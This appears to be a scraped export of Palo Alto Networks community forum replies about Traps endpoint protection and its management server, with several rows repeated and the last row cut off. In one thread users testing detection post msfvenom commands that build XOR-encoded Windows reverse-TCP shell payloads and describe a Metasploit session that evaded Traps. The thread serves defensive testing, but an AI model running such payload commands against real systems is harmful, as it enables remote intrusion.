424,131943,Willian,"Hi@JDominguezBased on your description, there are two applicable options: Standalone Deployment and Small Single Site Deployment.Standalone DeploymentThis design is typically recommended forinitial proof of concept (POC) or a small site with fewer than 3000 Traps agents, use a standalone deployment to install the following Endpoint Security Manager (ESM) components on a single server or virtual machine:• ESM Server• ESM Console• Forensic (quarantine) folder• DatabaseI don't recommend to any of my customers to use this design in production, as it does not provide any redundancy for console or cores.Small Single Site DeploymentAs per the link you posted, and the official admin guide, this design requires:This is the minimal I always recommend to all my clients due to the redundancy aspects and flexibility.Now to your questions.My recommendation is that you adopt theSmall Single Site Deployment1 x ESM Console + Core (Combined)1 x ESM Core (Redundancy)1 x Database Server - Notice that SQLITE is no longer supported or recommended by Palo Alto even in POCs; hence, the official recommendation for environments with more than 250 endpoints is SQL Server Enterprise or SQL Server Standard as per the below screenshot.Important: You only can have one console installed.For further details on requirements please refer tothe following for the administrator guide: link:https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/technical-documentation/40/endpoin...I hope this helps.",2,07-13-2017,12:45 AM
425,131943,JDominguez,"Hi @Willian,The above helps alot! Thanks for the time and effort you put into your reply - it's much appreciated!I'm sure many more folks will be using this post for reference.Regards,Josh Dominguez",0,07-13-2017,07:04 AM
426,131943,ESutedy,"Hi,I cant seem to find a setting to change the date format from m/d/y to d/m/y.If the setting is not there, how do i make suggestion to PA to add these setting?Thanks",0,09-06-2017,06:12 PM
427,131943,MyBudget,"I logged the same request as a bug under 4.0.1 a while back and was advised that it would be addressed in a future version, so I expect that it is on a road-map somewhere.Much as I can work with m/d/y formatting, it's nice to have the d/m/y formatting that we are used to and have with our other products, like Windows, McAfee, SQL, Office, SAP, Exchange (ok - maybe not so much Exchange - backend Powershell prefers m/d/y).",0,10-12-2017,09:38 PM
428,235335,ancis,LCMember1664Is your question referring to a process withing Traps (endpoint)?,0,10-23-2018,07:37 AM
429,230993,donohoe23,"HI Mate,Always worth verifyin with your account manager and local PANW SE. To best of my knowledge, POC to Paid not possible on the traps management service. It is a backend thing the way the instances are spun up in the cloud.Engage with your account manager or SE regardin releasing the name, or just pick a different one,The configuration should not take so long on the new TMS instance,cheersRob",0,10-21-2018,05:02 PM
430,230993,ancis,"Yali,Please see my answers in line:0) Am I doing something wrong? Isn there some way to just give it the new license and tell it that it's now a real boy?LOL, you will need to work with Palo Alto Networks support to start the process from POC to production (it is possible)1) Will I have to set this new instance up from scratch again? (Saving agent installations, previous event logs, anything, really)No, after migration you will still have the same instance you created during the POC2) I have to choose a new ""name"" because the URL and the cloud service instance names are already taken. Can I not? In any way that doesn't involve deleting the old service (so that I still keep all the data from my evaluation period)When you roll from POC to production, you will be using the same URL",0,10-23-2018,07:34 AM
431,236666,ancis,"iweltag,At this time, there is no feature that will allow a process to execute with user interaction. I think this can be a useful featurefor some. If you agree, you can open a support ticket with Palo Alto Network support and request a 'New Feature Request' to be created on your behalf.",1,10-23-2018,07:01 AM
432,236663,ancis,"AsifSid,Because several reasons can cause the error you are experiencing, I would recommend opening a case with Palo Alto Networks Traps support team, who can quickly assist diagnosingthe issue, and providing a resolve.",0,10-23-2018,05:39 AM
433,236098,donohoe23,"HI Mate,As at todays date, We can forward the logs to a syslog server using log forwarding and the logging service.https://www.paloaltonetworks.com/documentation/traps/tms/traps-management-service-admin/view-and-man...Best regards,Rob",0,10-21-2018,04:56 PM
434,235971,ancis,"Lan,There are several ways to flip the verdict of a Hash. The easiest way would be through the ESM/TMS on the hash itself, you will see an option to change the verdict. This will start a process to have a threat researcher validate the false positive and change the associatedverdict. Alternatively, you can open a support case with Palo Alto Support, who can request the verdict change on your behalf.",0,10-18-2018,05:01 AM
435,234512,ancis,"Sumit,Palo Alto Network support or your SE can help identify portions of the registry that display the information that you are looking for.Either team should be more than happy to assist you to get a better understanding and validation pieces you seek.",0,10-11-2018,08:32 AM
436,234918,ancis,"AbdulRahman_safwat-The watchdog service is a monitoring service, that makes sure all componentsfor the local traps agent start correctly. The natural state for that service is off. Should you see the watchdog service on, you should investigate the local agent.",0,10-11-2018,06:41 AM
437,234918,AbdulRahman_Safaria-labelwat,"Thank you for the quick repley@efrancis, but in the release notes of 4.1 there is the following sentence:""The watchdog service that monitors the status of critical Traps services such as local analysis now runs only when the endpoint boots. Previously, the watchdog service ran only when the user logged in to the endpoint. The change enables Traps services to restart earlier, thereby ensuring Traps protection is enabled before the user logs in.""So can you relate between it and the answer you provided, and also confirm to me since this service starts momentarily when the system boots, does this means that there are issues, or is it normal.Thanks",0,10-11-2018,06:52 AM
438,234918,ancis,"Previously the watchdogservice was tied to the user login, and now it is on the system side (during boot). If the service iscontinuing to run, you should investigate the local agent. If you see the service start and stop, you should be just fine.You can always open a case with Palo Alto Support, and one of the Traps support team should be able to assist with validatingproper operation of the local agent, As well, they will be able to answer any other questions you may have about the agent or ESM.",0,10-11-2018,07:04 AM
439,233001,ancis,"StPatrick,Yes there is, there are several steps to take, as well as a couple feilds that need to be changed. If you contact Palo Alto Netowrks support, they will be able to walk you through the process.",1,09-28-2018,08:31 AM
440,232180,BPry,"@lchan2550,I've got the 5.0.3 client working on Mojave at the moment, but I'm not sure if the latest 4.1 client works if you aren't using the TMS.Actually I have to make some modifications with this, as I just tested it with a clean beta install that hadn't seen the install yet. While the existing install started working last week with my personall install, trying to do a clean install still leaves you with a message that Mojave is too new to get installed.Tomorrow I'll attempt to do another transition will bringing a working install into Mojave and see if it works like that; hopefully PA releases a supported update shortly.",0,09-24-2018,04:50 PM
441,232180,ancis,Palo Alto should be releasing a compatible agent after QA testing against the GA release of Mojave.,0,09-25-2018,07:19 AM
442,232180,hancharenko,"I'm going to attempt to reinstall the agent, but this is the state of the Traps 5.0.3.1166 agent after upgrading to macOS Mojave on my workstation.",0,09-27-2018,05:29 AM
443,232180,ancis,Palo Alto Networks will release a compatible version once QA is complete with final testing against GA release of 10.14,0,09-27-2018,05:30 AM
444,232180,hancharenko,"Just got an update notification for Traps Agent5.0.3.1170, whichappears to support macOS Mojave GM.Thanks!",0,09-27-2018,08:13 AM
445,232180,GermanGobel,how did you get the update?,0,09-27-2018,12:05 PM
446,232180,ancis,"The updated installer is now an option when you create a new install package. Remember that all of your older install packages (OSX installer) will no longer work. As well, you can do a bulk upgrade of your endpoints, and monitor the upgrade via the 'Action Tracker' tab.",0,09-27-2018,12:08 PM
447,232180,GermanGobel,I created the installer and tried to upgrade manually.It installed but the exploit and malware protection is still grayed out. Should i unistall and do a clean install after that?thanks,0,09-27-2018,12:10 PM
448,232180,ancis,"uninstall/re-install would be advised. Should you still have an issue, please reach out to Palo ALto Networks support.",0,09-27-2018,12:11 PM
449,231186,ancis,"-TrondkApplied on: 81; Delivered: 2; Failed: 7Delivered: 2-- This means that the action was delivered to 2 of the 81 endpoints the action was applied to. When you created the rule, 81 machines checked in, had an action waiting for them, and started processing that action. 2 of the 81 have not sent back a final status for processing the action.Failed: 7-- Similar to the above, except 7 have sent back failed status for the action.To view the machines that failed, use the monitoring tab, and filter by versions. The 4.1.3 machines should stand out. You can troubleshoot the failed action, or open a support case->collect and send agent logs (to support case), and Palo Alto support can assist.",1,09-18-2018,06:33 AM
450,231186,trondk,efrancis!Thanks for clarifying.I would like to do as much of this research my self. Learning by doing 🙂Could you point me in the direction of logfile or how to obtain logfiles for more troubleshooting?,0,09-18-2018,10:35 PM
451,231186,ancis,"You can create a one time action from the ESM, or on the agent side, open the console and choose 'Send support file' You can then retrieve the log, from the monitoring tab, under data retrieval.",0,09-19-2018,10:59 AM
452,148312,SvenMik,"Hello Jimmy,I don't think you can set a restriction on the forensic folder size. What I would typically do is configure the quaraintine folder to a seperate disk. You can move the quarantine folder in the IIS Manager > Sites > Default Web Site > BitsUploads > Basic Settings > Modify the Physical path, Test the settings and press OK. Please note this might not be the best pratice configuration from Palo Alto Networks.You should also deleted unused preventions from the quarantine folder every 3 days according to Palo Alto Networks.",0,03-27-2017,06:21 AM
453,148312,chsmith,"Hi Jimmy,As SvenMik suggests, there isn't currently a configuration option to control the size of the Forensics folder on the ESM itself.As far as I'm aware, the location of this folder can be configured to wherever you prefer.We do recommend periodically removing old uploads from this directory on the ESM - a simple script can be configured to do so automatically. Support can provide you with an example designed to be run as a Windows Scheduled Task.",0,04-13-2017,02:45 PM
454,148312,thinson,We ran into this as well. Support will provide you with a basic batch command to delete anything in that directory. You may want the flexability to purge the Wildfire zips sooner than the Forensics zips (dump and log files). We cobbled together this PS script. You can modify the AddDays value to whatever works for your org. Remember...you can use the -WhatIf to verify results before you actually delete things. Add that after the -Remove-Item statement and you will see the what if.,1,08-15-2017,06:38 AM
455,148312,SARowe_NZ,"Hi,We have set quarantine to use a separate drive. Is it true that oldest files will be overwritten if the drive fills up?Also, if I physically remove the files (either manually or via script), will this have any impact on what is shown and available historically in ESM Console?e.g. if I remove a wildfire* file from the quarantine folder will the Traps console still be able to show full detail on the associated prevention event?Thanks,Shannon",0,09-06-2018,04:51 PM
456,131943,JDominguez,"Hey Community,I need some help with a deployment architecture.For a small install (less than 1000 end points) can both the DB and the EMS Console&Server be hosted on a single virtualized server?Or should we deploy the solution with 2 dedicated servers:1x server = ECM Console and ECM Server on same machine1x database server = SQLite OR SQL 2014 – not sure which one?According to the below documentation, the install can be done using one server.https://www.paloaltonetworks.com/documentation/40/endpoint/endpoint-admin-guide/traps-deployment-sce...Any help/feedback is much appreciated.- JD",0,07-11-2017,12:20 PM
457,131943,Willian,"Hi@JDominguezBased on your description, there are two applicable options: Standalone Deployment and Small Single Site Deployment.Standalone DeploymentThis design is typically recommended forinitial proof of concept (POC) or a small site with fewer than 3000 Traps agents, use a standalone deployment to install the following Endpoint Security Manager (ESM) components on a single server or virtual machine:• ESM Server• ESM Console• Forensic (quarantine) folder• DatabaseI don't recommend to any of my customers to use this design in production, as it does not provide any redundancy for console or cores.Small Single Site DeploymentAs per the link you posted, and the official admin guide, this design requires:This is the minimal I always recommend to all my clients due to the redundancy aspects and flexibility.Now to your questions.My recommendation is that you adopt theSmall Single Site Deployment1 x ESM Console + Core (Combined)1 x ESM Core (Redundancy)1 x Database Server - Notice that SQLITE is no longer supported or recommended by Palo Alto even in POCs; hence, the official recommendation for environments with more than 250 endpoints is SQL Server Enterprise or SQL Server Standard as per the below screenshot.Important: You only can have one console installed.For further details on requirements please refer tothe following for the administrator guide: link:https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/technical-documentation/40/endpoin...I hope this helps.",2,07-13-2017,12:45 AM
458,131943,JDominguez,"Hi @Willian,The above helps alot! Thanks for the time and effort you put into your reply - it's much appreciated!I'm sure many more folks will be using this post for reference.Regards,Josh Dominguez",0,07-13-2017,07:04 AM
459,131943,ESutedy,"Hi,I cant seem to find a setting to change the date format from m/d/y to d/m/y.If the setting is not there, how do i make suggestion to PA to add these setting?Thanks",0,09-06-2017,06:12 PM
460,131943,MyBudget,"I logged the same request as a bug under 4.0.1 a while back and was advised that it would be addressed in a future version, so I expect that it is on a road-map somewhere.Much as I can work with m/d/y formatting, it's nice to have the d/m/y formatting that we are used to and have with our other products, like Windows, McAfee, SQL, Office, SAP, Exchange (ok - maybe not so much Exchange - backend Powershell prefers m/d/y).",0,10-12-2017,09:38 PM
461,229834,BPry,"@dan731028,Yup. It's a known issue I was told since they integrated thePermissions feature. I've also gotten a lot of errors about license count and such that will usually go away if I navigate away from that tab and then try to do it again. Super annoying; they somehow managed to make TMS feel even more like a beta product.",1,09-06-2018,02:07 PM
462,229834,dan731028,"@BPryThanks. That's kind of what I figured was going on, but was just curious. Thanks for the info.",0,09-06-2018,02:10 PM
463,227828,JNK_90,"Hello Farzana,I would recommend to reach out to the Palo Alto Endpoint support and asking for the TrapsCleaner tool for that Traps version. This Tool deletes the whole Traps installation also if you are not able to delete it from control panel.Best regards,Jan",0,08-28-2018,12:38 AM
464,227828,moixsante,"Hi Farzana,Would you be able to execute Traps msi installers from command line? Executing Traps installer from the command line allows you to generate a log file. This log file will record why the uninstall is failing.CMD.exe -> msiexec /x path/to/traps.msi /l*v c:/Trapsinstaller.logYou could also look into Event viewer -> Application. You might get some more information there.",0,08-30-2018,09:11 AM
465,227828,ancis,Jan is correct. Contacting Palo Alto Support will assist uninstalling. They have tools specifically for these type of issues.,0,08-30-2018,09:14 AM
466,228342,ancis,That is very odd behavior. I would recommend to collect a support log from the reporting agent and reach out to Palo Alto Network Endpoint support. They will be very curious as to why you are seeing this behavior.,0,08-27-2018,05:36 AM
467,217874,ElasticSkyX,"Hi there,The Agent Unique ID is generated when the agent is installed. It is generated from the UUID of the machine that the agent is installed on.While the Traps Agent records the serial number of the primary disk device, a change of this doesn't trigger a regeneration of the Agent Unique ID:So to answer whenthe Agent Unique IDcouldchange:Basically anytime the Machine UUID changes, the Agent Unique ID will change. Hope this helps and hasn't confused the matter.Kind regards.",0,06-24-2018,06:58 PM
468,217874,gafrol,"Thank you, very helpful info.73Roland",0,06-25-2018,12:35 AM
469,217874,ElasticSkyX,No problems and glad to have been able to help. Thanks also for marking the solution as correct - very much appreciated 🙂,0,06-25-2018,11:10 PM
470,217874,RLI27,"While you are saying ""Basically anytime the Machine UUID changes, the Agent Unique ID will change"" that means when cloning a virtual machine with a already installed Traps Agent, thiswill change the agents Unique-IDautomatically (when? On StartUp? On ServiceStart?While doing Sysprep?) because the clone has a different UUID - correct?So there is no ""cleanup action"" required (for instance delete the agents unique-ID from registry)on the template before shutting it down - correct?Thx!",0,08-20-2018,04:53 AM
471,227468,ancis,"Brandon,Due to the unique nature of each environment, It is hard to make a specific recommendation, as 'Best Practice'. However, your sales engineer or Technical account manager (with a greater understanding of your environment) can be a great resource. As always, you can reach out to the Palo Alto Traps support team, with any questions you may have.",0,08-17-2018,07:34 AM
472,224407,ancis,You will need to work with your Palo Alto Networks account team. They will assist with activating the 5.0 instance and answer any questions you may have.,0,08-01-2018,06:22 AM
473,221920,ElasticSkyX,"Hi there,Sorry but could you bea little more specific? Are you wanting the Malware/Exploit engines to allow unknown processes without checking them?If so this is a little dangerous as that is why you have purchased and spent money on the solution 🙂 Would like to confirm before trying to answer.Kind regards.",0,07-31-2018,11:07 PM
474,131943,JDominguez,"Hey Community,I need some help with a deployment architecture.For a small install (less than 1000 end points) can both the DB and the EMS Console&Server be hosted on a single virtualized server?Or should we deploy the solution with 2 dedicated servers:1x server = ECM Console and ECM Server on same machine1x database server = SQLite OR SQL 2014 – not sure which one?According to the below documentation, the install can be done using one server.https://www.paloaltonetworks.com/documentation/40/endpoint/endpoint-admin-guide/traps-deployment-sce...Any help/feedback is much appreciated.- JD",0,07-11-2017,12:20 PM
475,131943,Willian,"Hi@JDominguezBased on your description, there are two applicable options: Standalone Deployment and Small Single Site Deployment.Standalone DeploymentThis design is typically recommended forinitial proof of concept (POC) or a small site with fewer than 3000 Traps agents, use a standalone deployment to install the following Endpoint Security Manager (ESM) components on a single server or virtual machine:• ESM Server• ESM Console• Forensic (quarantine) folder• DatabaseI don't recommend to any of my customers to use this design in production, as it does not provide any redundancy for console or cores.Small Single Site DeploymentAs per the link you posted, and the official admin guide, this design requires:This is the minimal I always recommend to all my clients due to the redundancy aspects and flexibility.Now to your questions.My recommendation is that you adopt theSmall Single Site Deployment1 x ESM Console + Core (Combined)1 x ESM Core (Redundancy)1 x Database Server - Notice that SQLITE is no longer supported or recommended by Palo Alto even in POCs; hence, the official recommendation for environments with more than 250 endpoints is SQL Server Enterprise or SQL Server Standard as per the below screenshot.Important: You only can have one console installed.For further details on requirements please refer tothe following for the administrator guide: link:https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/technical-documentation/40/endpoin...I hope this helps.",2,07-13-2017,12:45 AM
476,131943,JDominguez,"Hi @Willian,The above helps alot! Thanks for the time and effort you put into your reply - it's much appreciated!I'm sure many more folks will be using this post for reference.Regards,Josh Dominguez",0,07-13-2017,07:04 AM
477,131943,ESutedy,"Hi,I cant seem to find a setting to change the date format from m/d/y to d/m/y.If the setting is not there, how do i make suggestion to PA to add these setting?Thanks",0,09-06-2017,06:12 PM
478,131943,MyBudget,"I logged the same request as a bug under 4.0.1 a while back and was advised that it would be addressed in a future version, so I expect that it is on a road-map somewhere.Much as I can work with m/d/y formatting, it's nice to have the d/m/y formatting that we are used to and have with our other products, like Windows, McAfee, SQL, Office, SAP, Exchange (ok - maybe not so much Exchange - backend Powershell prefers m/d/y).",0,10-12-2017,09:38 PM
479,222934,ancis,you can view and download from here:https://www.paloaltonetworks.com/documentation/traps/4-2/traps-endpoint-security-manager-release-not...,1,07-19-2018,06:53 AM
480,221198,ancis,The cloud-based version of Traps can be downloaded from your TMS instance (after setup and configuration). The on-prem version of traps can be downloaded from the Palo Alto networks support site.,0,07-09-2018,08:37 AM
481,221198,BigPalo,TMS? what that means?I can not find the on-prem version of traps in support site.,0,07-09-2018,08:38 AM
482,221198,ancis,TMS: traps managementservice.https://www.paloaltonetworks.com/documentation/traps/tms/traps-management-service-admin/traps-manage...The options you see on the support site are only on-premise solutions. ESM/Traps 4.2.0 is the latest version.,0,07-09-2018,08:40 AM
483,220615,ancis,"Alex,You will want to stand up your new 2016 server, and add it to your existing ESM environment (install at least Core, if not Console as well). Once you add it to the environment, you will see it on the multi ESM tab. Let this configuration stew for a week or two, and shut down the 08 box.This will allow for all of your endpoint to check-inand learn about the new server. The multi-ESM server list is passed to all endpoints on check in. When all of your endpoints know about the new server, turn the old one off (the 08 box). Then remove it from the environment on the Mutli-esmtab.If you open a case or call into supportthey will be able to answer any questions and assist with the migration to the new server.",0,07-05-2018,06:21 AM
484,220615,Alex_Samad,So1) install ESM on the new server2) add it on as a 2ESM -> this will propogate all the policies I have ?3) leave it runing for a while4) add a cname record of the old ESM to point to th new ESM and then turn off the old ESM5) update the ESM config to remove the 2 ESM,0,07-05-2018,03:47 PM
485,220615,ancis,"1) install ESM on the new servercorrect2) add it on as a 2ESM -> this will propogate all the policies I have ?Yes, all of the policies are stored in the database.3) leave it runing for a whilecorrect, this is to make sure machines that dont always run, or are off the wire during the change, have the ability to check in. Once you have a large majority of the env. moved to the new server (validating via agent monitoring, that they have checked in since the new core was added), you can feel confident turning off the old server, and removing from the ESM4) add a cname record of the old ESM to point to th new ESM and then turn off the old ESMNot needed unless DNS records control the path back to the core, the endpoint will see the new server and attempt to connect, when the 1st one no longer be present. Once the server is removed from the ESM, it will no longer publish it as a connection point to the agents on theirnext check in.5) update the ESM config to remove the 2 ESMYou just need to remove it from the ESM console",0,07-06-2018,03:38 PM
486,204826,ElasticSkyX,"Hi there,We are running Traps on an Exchange 2010 environment without any issues. No special requirements or provisions.Our environment is as follows: 2 x CAS/HT, 6 x Mailbox servers in a DAG and 1 x Mailbox server for journaling. All running in Windows Server 2008 R2.Just make sure you verdict your servers before deployment and there should be no surprises 🙂Kind regards.",0,05-18-2018,10:38 PM
487,204826,macklon,"Agree, and have had a similar experience. Deployed Traps into an Exchange 2016 environment and have had no issues so far however we did hash and verdict all of the executables on the exchange servers before we activated Traps. No surprises!If anyone needs to do this, I found these docs helpful:RunningSigCheck:https://www.paloaltonetworks.com/documentation/34/endpoint/endpoint-admin-guide/manage-traps-in-a-vd...Uploading Hashes to Wildfire / Receiving Verdicts:https://www.paloaltonetworks.com/documentation/34/endpoint/endpoint-admin-guide/manage-traps-in-a-vd...Note: if you're not configuring a VDI image you can skip the steps about marking the image as VDI, etc.",1,05-30-2018,08:38 AM
488,204826,dkehl,I was also wondering about this and Windows Servers in general. Thanks for posting.,0,06-27-2018,01:27 PM
489,219013,ElasticSkyX,"Hi there,Firstly - are you really sure you want to disable the protection mechanisms? It doesn't seem to be a good idea to buy a product that is designed to protect your environment and then disable it from working 🙂With the warning and waiver out of the way. To do what you require, you simply create a new policies which will override the default ones. Things to note:The policy with the highest ID and is applicable to your EndPoint wins so it should be the new policies you have just created.Should have probably asked this first but is there an issue you are struggling with or a reason for wanting to switch to notification for the protection modules?Kind regards.",0,06-24-2018,07:26 PM
490,211568,ancis,"Traps will be releasing a 4.2 version in the next few months. The maintance release for 4.1.x, should be released in the next couple of weeks. Both are on prem.",1,04-26-2018,05:43 AM
491,211568,Gabriele,Will ESM on premise eventually go away or no longer be supported?,0,06-20-2018,09:10 AM
492,212572,mdw189,"I too have had concerns around similar items, as in ""wtf, seriously"" moments. I know that doesn't help you but just sayin' I share your concern.",1,05-02-2018,05:41 AM
493,212572,BizBo,"Yep I'm with you.Biggest concern I have flagged this in WF as the wrong result, and left a message. It would be nice if someone from PA came back and said, yep we have this info and we are working on this or 'OMG you are right, nice spot'I'm starting to think my over confidence in Traps was misplaced.Darren",0,05-02-2018,06:15 AM
494,212572,jscaggs,What was the hash on the file?,0,05-02-2018,09:54 AM
495,212572,BizBo,E53A09E7DA85F128ADFA180428C504262DE14375116197358E7734B113E8F117Darren,0,05-04-2018,05:29 AM
496,212572,BizBo,"But I can recreate the file and a new hash will be created, so I see that as not a benefit. I would of thought as this is exhibiting certain behaviours that Traps or WF would have picked it out as Traps is supposed to be behavourial not hash look ups.So effectively I could recreate the file 1000 times with same behaviour all with different hashes, but the behaviour would still not picked up.I would like someone from PA comment on this because I am seriously worried, I know the NGFW will stop the traffic on port 4444 with I am sure with clever thinking that could be bypassed, but the conversation is about Traps stopping odd behaviour before it becomes something else.PA any comments?Darren",0,05-04-2018,05:45 AM
497,212572,jscaggs,Which options or payload are you using? I'm getting local analysis detections for:msfvenom -f exe-only -a x64 --platform windows -p windows/x64/shell/reverse_tcp lhost=192.168.1.101 lport=4444 > /tmp/tcp_reverse_4444.exemsfvenom -f exe-only -a x64 --platform windows -e x64/xor -i 42 -p windows/x64/shell/reverse_tcp lhost=192.168.1.101 lport=4444 > /tmp/tcp_reverse_4444_encode_xor.exemsfvenom -f exe-only -a x64 --platform windows -e x64/xor -i 42 -p windows/x64/powershell_reverse_tcp lhost=192.168.1.101 lport=4444 >/tmp/tcp_reverse_4444_encode_xor_2.exemsfvenom -f exe-only -a x64 --platform windows -p windows/x64/powershell_reverse_tcp lhost=192.168.1.101 lport=4444 > /tmp/tcp_reverse_4444_2.exe,0,05-04-2018,10:47 AM
498,212572,BizBo,"I used a script called 'hacktheworld' installed into Kali, it makes the payload and BOOM!https://www.youtube.com/watch?v=Z-Kx4Bb3H7s&ab_channel=KaliPentestingBut I have done a test again this morning with a new payload and Traps ignored it again and smart screen popped up!!Please have a go with the script in the video and see how you get on, its quite scary.Darren",0,05-10-2018,03:21 AM
499,212572,BizBo,"and yep...I ran the payload and it connected to my MSF Exploit running on Kali!And Traps just ignores it... I wish someone from PA would look into this and maje a comment. I know that the payload is effectively just opening up a session its behaviour is malcious or beyond the normal.and Wildfire...As you can see it fails and marks this as benign, which if I flag this as a false positive they will mark this as Maware...Seriously worrying...",0,05-10-2018,03:44 AM
500,212572,jdelio,"@BizBo, I have notified someone in the traps group about this, but in the meantime, have you contacted support at all about this? Let them know about this as a False Negative? This would be my first recommendation, as I do not know why it isn't catching on this, but we need to find out why and help fix it.",1,05-10-2018,07:57 AM
501,216900,ancis,"The dumps that are gathered from a prevention event include files in use during the time of the prevention, and a memory snapshot (.dmp). The dmp file can be viewed with programs such as windbg. Palo Alto Traps support has been trained on how to review and analyze these dumps, and can review any dump you submit to them. You can always open a case through the Palo Alto support portal, and submit the dump for review. Should they find the prevention to be a false positive, they can offer a solution for you.",0,06-07-2018,05:59 AM
502,215416,n_downey,"On your console look at the Policies tab / Hash Control section. Set the search criteria as Endpoint IS (machine being scanned) and VERDICT ISN'T BENIGN then click search. This will return all of the hashes that are not benign from that machine and the status of wildfire uploads of them. This should at least give you a way to see where the ESM server is in evaluating the hashes.I believe I may have experienced something similar a while ago. I had to open the TRAPS AGENT console on the endpoint, check in, close the TRAPS console on the agent, wait a couple minutes and then start the process of running the CYTOOL followed by the TRAPS VDI TOOL. That ensured that the local agent had made a successful connection to the ESM before running the tool.",1,05-24-2018,04:15 PM
503,215416,MikeBourda,"Thank you for the tip. So I see that I'm getting hundreds of failures. This boggles my mind. I see WildFire working on the firewalls, I see other hosts able to submit files successfully to WildFire via Traps. What gives?",0,05-25-2018,10:21 AM
504,215416,ElasticSkyX,"Hi there,Couple of points - the second screenshot confirms that the client is uploading the files successfully to the ESM. As far as I'm aware there is no need to worry about the communications between the client and the server.At this point there is a local user called ""TrapsDownloader"" which moves the files from the BITS folderin order to transfer to Wildfire. I would say it is at this point the wheels are coming off your bus 🙂Two options:At this stage please run your mouse across the Upload Status icon to see what it says. You will need to check the Wildfire website to confirm if your upload limit is exceeded per day.If its not due to the upload limit being exceeded then we can try checking a couple of places to see if its the second option.Firstly in C:\ProgramData\Cyvera\Logs there is a log called Server_<Servername>.log which rotates after 20MB in size. In here see if you have an entry like this:ERRORCyveraServer4Cyvera.Server.Facades.WildFire.WildFireUploadFileServiceWildFireError when downloading to Temp Folder: Unauthorized, HTTP status:(Unauthorized). If so then check your IIS logs and it is likely you have an entry (probably multiple) like this:GET /BitsUploads/Wildfire_30_05_2018-04_06_59_940_2895659a-b743-49c5-bb8f-9942d94a8298.zip - 443 - 10.1.2.23 - - 401 2 5 0From the above you can see a HTTP 401 (Unauthorized). In my case this also has a corresponding entry in the Windows Security log like this:This is because our ESM server doesn't have the same name as on the certificate and therefore I need to enable BackConnectionHostNames to allow the local account to access the server via the CNAME.Sorry if I have gone over known and taken for granted information.Let me know if this helps or hinders. Probably want to make sure we are troubleshooting the same issue before making recommendations on changes 😉Kind regards.# Edited to remove incorrect information. Forgot that ""Upload limit exceeded"" is in relation to the size of the files not number. Sorry for the misinformation.",2,05-30-2018,09:32 PM
505,214758,ElasticSkyX,"Hi there,I’m with your boss. We have had a couple of our countries stall with deploying Traps because of the disruption caused to the team with processes not launching. Mainly in-house developed stuff but still causes a mild panic for people. The deploy and see does really work with management at this point 😉What we did (are doing) is to use the TrapsVDITool and verdict all the machines (executables) before deployment. This means we have no surprises in regards to files on the end machines.Once this was completed we then deployed the Traps agent with confidence.Only additional was we have a policy that allows Office macros run but notify. The idea is that we didn’t want a helpdesk storm and we can verdict then approve business related stuff. After a month we will remove this policy (modify) and then anything new will be evaluated on a case by case basis.Hopes this helps 🙂",1,05-18-2018,10:44 PM
506,214758,MikeBourda,Thanks Glen! I can see that would be very useful!I can't seem to find where to download the Traps VDI Tool. Any help?,0,05-21-2018,01:07 PM
507,214758,MikeBourda,Disregard. I'm an idiot. It comes bundled with the Traps Agent download. 😕Thanks again Glen for the help!,0,05-21-2018,01:11 PM
508,214758,ElasticSkyX,"No problems.Couple of lessons we have learned the hard way:To to get around 1) and 2) we created a script that we run from a central server which modifies theSigcheckCSV so it has UNC path rather than local paths. This means the TrapsVdiTool can access the files from a client with the agent.Another option is to run the Sigcheck from a central machine which means it already has UNC paths. We initially did this but the process was slow even for our small fleet of 300 servers. A new script was created that distributes the running of Sigcheck to each of the servers, saving the signatures to a central share. This was throttled to 10 servers running simultaneously which reducedthe time from 7-10 days to ~30 hours.Once a machine has been fully verdicted then the agent can go on the machine. We then verdict again locally on the machine so the local cache is immediately populated.Let me know if I can be of further assistance 🙂",1,05-21-2018,02:00 PM
509,214758,MikeBourda,"I got a bunch of errors. Any ideas on what's causing this?A few notes up front:1. I confirmed Traps runtime services were completely stopped.2. I confirmed that the sigcheck .csv file had coherent data3. I am running with god mode permissions (domain admin)4. I do not have Windows Firewall running5. I am running the VDI tool from the machine that I ran the sigcheck against (my own workstation)6. I have run VDI with both SSL binding on and off (we're using SSL for connections to the ESM)7. I have run VDI with the uninstall password and without.8. We are using default port 2125.9. I've made no changes to hash bulk size, tool timeout, or wildfire verdicts check interval10. I've run VDI both with ""Wait for WildFire Verdicts"" set to false and true; same with Write malware to cach.11. I've made no changes to ""Write grayware to cache"" (stayed at ""True"")Have you come across those errors?",0,05-21-2018,04:30 PM
510,214758,ElasticSkyX,"Hi there,Definitely don't need Domain Admins. At most local administrator on the endpoint but lets move on 🙂Firstly can you confirm you are running TrapsVdiTool using ""Run as administrator""?Kind regards.",1,05-21-2018,04:35 PM
511,214758,MikeBourda,"Yeah... back to that whole ""I'm an idiot"" thing... I think I need to turn in my IT nerd creds or something.That was the problem. I owe you a beer.",0,05-21-2018,04:40 PM
512,214758,ElasticSkyX,LOL - I'm just glad it was something simple. Always good to have a second set of eyes peer review something that might have been missed 🙂Hold that beer... I'll take a virtual lemonade instead 😉Have a great day!,0,05-21-2018,04:44 PM
513,131943,JDominguez,"Hey Community,I need some help with a deployment architecture.For a small install (less than 1000 end points) can both the DB and the EMS Console&Server be hosted on a single virtualized server?Or should we deploy the solution with 2 dedicated servers:1x server = ECM Console and ECM Server on same machine1x database server = SQLite OR SQL 2014 – not sure which one?According to the below documentation, the install can be done using one server.https://www.paloaltonetworks.com/documentation/40/endpoint/endpoint-admin-guide/traps-deployment-sce...Any help/feedback is much appreciated.- JD",0,07-11-2017,12:20 PM
514,131943,Willian,"Hi@JDominguezBased on your description, there are two applicable options: Standalone Deployment and Small Single Site Deployment.Standalone DeploymentThis design is typically recommended forinitial proof of concept (POC) or a small site with fewer than 3000 Traps agents, use a standalone deployment to install the following Endpoint Security Manager (ESM) components on a single server or virtual machine:• ESM Server• ESM Console• Forensic (quarantine) folder• DatabaseI don't recommend to any of my customers to use this design in production, as it does not provide any redundancy for console or cores.Small Single Site DeploymentAs per the link you posted, and the official admin guide, this design requires:This is the minimal I always recommend to all my clients due to the redundancy aspects and flexibility.Now to your questions.My recommendation is that you adopt theSmall Single Site Deployment1 x ESM Console + Core (Combined)1 x ESM Core (Redundancy)1 x Database Server - Notice that SQLITE is no longer supported or recommended by Palo Alto even in POCs; hence, the official recommendation for environments with more than 250 endpoints is SQL Server Enterprise or SQL Server Standard as per the below screenshot.Important: You only can have one console installed.For further details on requirements please refer tothe following for the administrator guide: 